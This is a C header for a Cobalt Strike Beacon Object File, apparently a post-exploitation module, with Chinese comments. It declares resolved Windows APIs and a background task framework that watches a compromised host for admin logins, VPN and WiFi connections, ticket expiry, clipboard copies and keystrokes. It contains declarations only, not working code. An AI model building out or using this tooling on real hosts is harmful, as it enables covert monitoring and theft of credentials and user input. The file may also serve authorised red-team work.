#ifndef ASYNC_BOF_H
#define ASYNC_BOF_H

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <winsock.h>
#include <iphlpapi.h>

// 确保ULONG_PTR定义可用
#ifndef ULONG_PTR
#define ULONG_PTR unsigned long long
#endif

// 常量定义
#ifndef CF_TEXT
#define CF_TEXT 1
#endif

#ifndef IF_TYPE_IEEE80211
#define IF_TYPE_IEEE80211 71
#endif

#ifndef ERROR_FILE_NOT_FOUND
#define ERROR_FILE_NOT_FOUND 2L
#endif

#ifndef SERVICE_RUNNING
#define SERVICE_RUNNING 0x00000004
#endif

#ifndef SC_MANAGER_CONNECT
#define SC_MANAGER_CONNECT 0x0001
#endif

#ifndef SERVICE_QUERY_STATUS
#define SERVICE_QUERY_STATUS 0x0004
#endif

// Cobalt Strike BOF API definitions
typedef struct {
    char* original;
    char* resolved;
} datap;

// Beacon API函数声明
void BeaconPrintf(int type, char* fmt, ...);
void BeaconDataParse(datap* parser, char* buffer, int size);
int BeaconDataInt(datap* parser);
short BeaconDataShort(datap* parser);
int BeaconDataLength(datap* parser);
char* BeaconDataExtract(datap* parser, int* size);

// 内存操作函数声明
void* MSVCRT$malloc(size_t size);
void MSVCRT$free(void* ptr);
void* MSVCRT$calloc(size_t num, size_t size);
int MSVCRT$strcmp(const char* str1, const char* str2);
char* MSVCRT$strcpy(char* dest, const char* src);
char* MSVCRT$strncpy(char* dest, const char* src, size_t n);
size_t MSVCRT$strlen(const char* str);
void* MSVCRT$memset(void* ptr, int value, size_t num);
int MSVCRT$sprintf(char* str, const char* format, ...);
char* MSVCRT$strstr(const char* str, const char* substr);

// Windows API函数声明
HANDLE WINAPI KERNEL32$GetCurrentProcess(VOID);
HANDLE WINAPI KERNEL32$CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
DWORD WINAPI KERNEL32$GetCurrentThreadId(VOID);
DWORD WINAPI KERNEL32$GetTickCount(VOID);
DWORD WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);
HGLOBAL WINAPI KERNEL32$GlobalLock(HGLOBAL hMem);
BOOL WINAPI KERNEL32$GlobalUnlock(HGLOBAL hMem);
HGLOBAL WINAPI KERNEL32$GlobalAlloc(UINT uFlags, SIZE_T dwBytes);
HGLOBAL WINAPI KERNEL32$GlobalFree(HGLOBAL hMem);

LONG WINAPI ADVAPI32$RegOpenKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
LONG WINAPI ADVAPI32$RegQueryValueExA(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
LONG WINAPI ADVAPI32$RegSetValueExA(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
LONG WINAPI ADVAPI32$RegCreateKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD Reserved, LPSTR lpClass, DWORD dwOptions, REGSAM samDesired, LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD lpdwDisposition);
LONG WINAPI ADVAPI32$RegCloseKey(HKEY hKey);
LONG WINAPI ADVAPI32$RegDeleteValueA(HKEY hKey, LPCSTR lpValueName);
LONG WINAPI ADVAPI32$RegDeleteKeyA(HKEY hKey, LPCSTR lpSubKey);
LONG WINAPI ADVAPI32$RegEnumKeyExA(HKEY hKey, DWORD dwIndex, LPSTR lpName, LPDWORD lpcchName, LPDWORD lpReserved, LPSTR lpClass, LPDWORD lpcchClass, PFILETIME lpftLastWriteTime);
BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
BOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
BOOL WINAPI ADVAPI32$LookupAccountSidA(LPCSTR lpSystemName, PSID Sid, LPSTR Name, LPDWORD cchName, LPSTR ReferencedDomainName, LPDWORD cchReferencedDomainName, PSID_NAME_USE peUse);
BOOL WINAPI ADVAPI32$AllocateAndInitializeSid(PSID_IDENTIFIER_AUTHORITY pIdentifierAuthority, BYTE nSubAuthorityCount, DWORD nSubAuthority0, DWORD nSubAuthority1, DWORD nSubAuthority2, DWORD nSubAuthority3, DWORD nSubAuthority4, DWORD nSubAuthority5, DWORD nSubAuthority6, DWORD nSubAuthority7, PSID *pSid);
BOOL WINAPI ADVAPI32$EqualSid(PSID pSid1, PSID pSid2);
PVOID WINAPI ADVAPI32$FreeSid(PSID pSid);

HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
BOOL WINAPI KERNEL32$Process32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
BOOL WINAPI KERNEL32$Process32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
SC_HANDLE WINAPI ADVAPI32$OpenSCManagerA(LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD dwDesiredAccess);
SC_HANDLE WINAPI ADVAPI32$OpenServiceA(SC_HANDLE hSCManager, LPCSTR lpServiceName, DWORD dwDesiredAccess);
BOOL WINAPI ADVAPI32$QueryServiceStatus(SC_HANDLE hService, LPSERVICE_STATUS lpServiceStatus);
BOOL WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE hSCObject);
DWORD WINAPI IPHLPAPI$GetAdaptersInfo(PIP_ADAPTER_INFO pAdapterInfo, PULONG pOutBufLen);
DWORD WINAPI IPHLPAPI$GetNetworkParams(PFIXED_INFO pFixedInfo, PULONG pOutBufLen);

// USER32 API函数声明 (用于剪贴板和键盘监控)
BOOL WINAPI USER32$OpenClipboard(HWND hWndNewOwner);
BOOL WINAPI USER32$CloseClipboard(VOID);
HANDLE WINAPI USER32$GetClipboardData(UINT uFormat);
BOOL WINAPI USER32$AddClipboardFormatListener(HWND hwnd);
BOOL WINAPI USER32$RemoveClipboardFormatListener(HWND hwnd);

// 事件类型定义
typedef enum {
    EVENT_ADMIN_LOGIN,
    EVENT_PROCESS_START,
    EVENT_USER_LOGIN,
    EVENT_NETWORK_ISOLATION,
    EVENT_VPN_CONNECTION,
    EVENT_WIFI_CONNECTION,
    EVENT_TICKET_EXPIRATION,
    EVENT_CLIPBOARD_COPY,  // 新增：剪贴板复制事件
    EVENT_KEYBOARD_INPUT,  // 新增：键盘输入事件
    EVENT_USER_LOGON      // 新增：用户登录事件（与USERMON对应）
} event_type_t;

// 任务状态定义
typedef enum {
    TASK_PENDING,
    TASK_RUNNING,
    TASK_COMPLETED,
    TASK_CANCELLED
} task_status_t;

// 事件结构体
typedef struct {
    event_type_t type;
    char host[64];
    union {
        struct {
            char username[64];
        } admin_login;
        struct {
            char process_name[64];
        } process_start;
        struct {
            char username[64];
            int is_remote;
        } user_login;
        struct {
            char ssid[64];
        } wifi_connection;
        struct {
            unsigned int minutes_left;
        } ticket_expiration;
        struct {
            char name[64];
            char data[128];
        } custom;
    } data;
    unsigned long long timestamp;
} event_t;

// 任务结构体
typedef struct async_task {
    char name[64];
    task_status_t status;
    event_type_t event_type;
    char params[256];
    unsigned int interval;   // 检查间隔（秒）
    unsigned int last_check; // 上次检查时间
    unsigned int task_id;    // 任务ID
    HANDLE thread_handle;    // 线程句柄
    DWORD thread_id;         // 线程ID
    struct async_task* next; // 指向下一个任务的指针
} async_task_t;

// 函数声明
void go(char* args, int length);
int check_event(async_task_t* task);
void report_event(async_task_t* task);
event_t* create_event(event_type_t type, const char* host);
void destroy_event(event_t* event);
int monitor_admin_login(async_task_t* task);
int monitor_process_start(async_task_t* task);
int monitor_user_login(async_task_t* task);
int monitor_network_isolation(async_task_t* task);
int monitor_vpn_connection(async_task_t* task);
int monitor_wifi_connection(async_task_t* task);
int monitor_ticket_expiration(async_task_t* task);
DWORD WINAPI task_thread_proc(LPVOID param);
async_task_t* create_task(const char* name, event_type_t type, const char* params, unsigned int interval);
void destroy_task(async_task_t* task);
int save_task(async_task_t* task);
int load_tasks();
int cancel_task(unsigned int task_id);
void list_tasks();
int delete_task(unsigned int task_id);
async_task_t* get_task_by_id(unsigned int task_id);

// 新增的监控函数
int monitor_clipboard_copy(async_task_t* task);
int monitor_keyboard_input(async_task_t* task);
int monitor_user_logon(async_task_t* task);

// 辅助函数声明
const char* get_event_name(event_type_t type);
const char* get_task_status_name(task_status_t status);

// 本地测试相关函数声明
#ifndef BOF_BUILD
int main(int argc, char* argv[]);
void test_local_functionality();
#endif

#endif // ASYNC_BOF_H